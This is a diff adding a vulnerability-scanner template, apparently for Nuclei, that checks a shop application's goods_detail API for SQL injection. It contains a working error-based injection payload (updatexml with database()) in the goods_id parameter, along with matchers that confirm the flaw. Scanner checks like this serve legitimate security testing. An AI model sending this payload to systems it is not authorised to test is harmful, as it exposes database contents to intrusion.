@@ -1,0 +1,27 @@
+id: Seller-goods_detail-sqlInjection
+
+info:
+  name: Seller-goods_detail-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    Seller-goods_detail-sqlInjection
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQLSTATE"
+          - "XPATH"
+        condition: and
+
+      - type: status
+        status:
+          - 404
